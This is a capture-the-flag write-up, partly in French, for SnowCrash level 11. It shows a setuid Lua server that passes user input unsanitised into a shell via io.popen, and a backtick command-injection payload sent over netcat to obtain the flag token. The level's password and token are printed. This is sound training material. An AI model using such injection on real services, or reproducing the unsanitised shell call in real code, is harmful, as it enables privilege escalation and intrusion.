# LEVEL 11

**LOGIN: level11**

**PASSWORD: feulo4b72j7edeahuete3no7c**

 ----


```
level11@SnowCrash:~$ ls -l 
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
```
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Le reverse sha1 de `"f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` ne donne rien malheureusement. 

Avec `netstat` on confirme bien que le port 5151 est en écoute

`tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -`


Cette ligne ` prog = io.popen("echo "..pass.." | sha1sum", "r")` doit nous permettre d'exploit un subshell avec le mot de passe entrée.

```
nc localhost 5151
Password: `getflag >/tmp/exploit`
Erf nope..
level11@SnowCrash:~$ cat /tmp/exploit
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

**TOKEN :fa6v5ateaw21peobuub8ipe6s**

